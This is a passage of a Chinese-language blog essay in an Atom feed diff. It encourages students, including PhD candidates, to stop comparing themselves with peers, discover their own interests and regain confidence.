+<p>浮躁，往往来源于与旁人的比较，有意也好，无意也罢，是具有社会属性的我们难以避免的人之常情。然而，如果从比较中无法再获得正向激励，反而发现其开始对自信打击，使自我怀疑，我们就需要开始重新审视自己面对生活的态度了。</p>
+<p>学不懂一门课程，就慢慢学，多会做一道题，多弄懂一个知识点，都比之前的自己更好了，就值得肯定；人生很长，不能因为毕业时没有优势就同时否认毕业几年后的自己，如果仅仅为此就放弃了当下的努力，桎梏不前，那理由再多也只不过是掩饰自己懒惰的借口；同门发表的论文多而自己没有论文，并不代表你不优秀，它与研究的课题、幸运以及同门特别优秀都有关系，如果真心付出努力后依然收效甚微，就不要妄自菲薄，虽然五年对读博时的你很长，却也不过是你几年后与好友在饭桌闲聊时谈及的一段经历罢了。</p>
+<p>这个世界的存在是唯物的，但是如何看待她的存在却是唯心的。不要再同旁人比较了，很多时候这一辈子这么累就是因为人生路上一直看着别人不看路才磕磕绊绊的。从当下浮躁的集体价值观中逃出来吧，心远地自偏，才能看清脚下的路，这路上实际上只有你，要比也只和自己比，如此，很多东西便会释然了。</p>
+<h3 id="认识自己">认识自己</h3>
+<p>人生其实有一门课，就是不断地发掘自己，认识自己，看看什么事情可以让自己愿意花时间和精力去做，做的过程是快乐的，做完后是欣慰满足的。很多时候兴趣的养成，是靠因缘际遇碰到了，你花时间去做发现自己并不排斥，然后一路做下来，越来越专业，受到越来越多来自他人的正向反馈与自我的肯定，也就越来越愿意花时间去做，由此进入了正向的循环。但是需要注意的是，这个“因缘际遇”碰到的事情，不一定是你大学学的专业。</p>
+<p>很多时候，我们被生活推着走，貌似18年的努力就是为了能上一个好大学，选择一个好专业。但是什么是好专业？大家眼中的好专业，就是好专业吗？现在的大学教育培养更多的是专业技能，缺失了很多能够让人自省、自察、自悟的人文关怀，社会的浮躁也多源于此，我曾在《浅谈国内高校编程语言教育》一文中写到：“这些对兴趣的专注和纯粹本应该是大学生在自己专业上该有的年轻的、百舸争流的样貌，如今却被年薪、房价和社会的物化价值观所左右。如果连我们国家顶尖大学的教育都摆脱不了物欲横流的浮躁，又如何完成国家民族集体人格的进一步塑造？”</p>
+<p>我真心希望大家最终都能找到自己心中的“兴趣”，哪怕你现在学着计算机，以后却只想开一家奶茶店。这也许需要很长的一段时间，但是这一切却又很值得，寻找它的路上，你会更加了解自己，更加怡然自得，因为你一直在修改着属于自己幸福的定义。</p>
+<h3 id="重拾信心">重拾信心</h3>
+<p>相信每一个同学都曾有自信的时刻，自信的时候不会多想，只想去做，只想做好。既然曾经拥有过，它就一直还在，也许你因曾经历的人或事将它埋在了心底，怯于外露，但它终究是属于你的。如果能“不浮躁”，如果开始做好“认识自己”的准备，就请把那份自信重拾起来，微笑着上路吧。</p>
+]]></content>
+    </entry>
+</feed>
